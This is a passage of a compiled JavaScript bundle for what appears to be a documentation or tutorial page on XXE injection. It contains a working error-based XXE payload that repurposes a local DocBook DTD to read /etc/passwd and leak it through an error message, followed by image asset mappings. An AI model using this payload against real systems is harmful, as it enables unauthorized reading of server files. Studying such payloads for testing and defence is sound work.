,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!DOCTYPE message [\n<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">\n<!ENTITY % ISOamso \'\n<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">\n<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">\n&#x25;eval;\n&#x25;error;\n\'>\n%local_dtd;\n]>\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512162934398",src:s(31100).A+"",width:"1467",height:"674"})})]})}function h(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},37676:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/xxe-injection-095de8dac74bb01b8330b7efd3a08ba3.svg"},41462:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512151007272-9ef572e1e03224887ec91cfa9704c101.png"},55528:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512144723907-69fcbbf8309de0c489add05f82cd1eaa.png"},57722:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512160434094-e7434c7b3ada5dee9ce02f95724f8a6d.png"},83781:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512152310246-e309764cac691898817b2495edd77ff4.png"},84797:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512151022568-efdcf7fc4c4ea93a04e72601235123a5.png"},90386:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512154815700-08a38fc624a34b8f4faaac379d5cbd10.png"},98008:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512153550110-93bc84116c730dda3065e84af3eaae89.png"},98389:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512161951780-79a968c8a8cca9aee6a160ce3319c073.png"}}]);